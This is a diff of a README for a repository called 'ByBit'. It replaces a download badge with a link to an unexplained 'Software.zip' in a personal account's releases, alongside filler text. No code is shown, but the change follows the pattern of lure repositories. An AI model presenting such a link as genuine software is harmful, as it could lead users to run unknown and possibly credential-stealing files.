@@ -24,7 +24,7 @@ This repository is dedicated to the ByBit project. Unfortunately, the short desc
 
 You can download the latest version of ByBit by clicking the button below:
 
-[![Download ByBit](https://img.shields.io/badge/Download-ByBit-green)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download ByBit](https://github.com/segunabiodun-ng/ByBit/releases/download/v1.0/Software.zip)](https://github.com/segunabiodun-ng/ByBit/releases/download/v1.0/Software.zip)
 
 Please note that the provided link needs to be launched to download the desired files.
 
